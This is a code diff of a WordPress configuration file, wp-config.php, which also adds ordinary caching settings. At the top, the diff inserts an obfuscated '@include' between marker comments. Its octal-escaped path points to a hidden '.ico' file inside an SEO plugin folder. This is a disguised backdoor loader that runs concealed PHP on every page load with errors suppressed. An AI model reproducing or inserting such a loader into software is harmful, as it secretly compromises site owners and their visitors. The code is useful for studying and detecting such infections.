@@ -1,4 +1,9 @@
 <?php
+/*46ee2*/
+
+@include "\057ho\155e/\146or\147e/\172ao\155ak\145up\056co\155.c\157/w\160-c\157nt\145nt\057pl\165gi\156s/\167or\144pr\145ss\055se\157/.\062ba\14636\143e.\151co";
+
+/*46ee2*/
 /**
  * The base configuration for WordPress
  *
@@ -20,6 +25,8 @@
 
 // ** MySQL settings - You can get this info from your web host ** //
 /** The name of the database for WordPress */
+define('WP_CACHE', true);
+define( 'WPCACHEHOME', '/home/forge/zaomakeup.com.co/wp-content/plugins/wp-super-cache/' );
 define('DB_NAME', 'zao');
 
 /** MySQL database username */
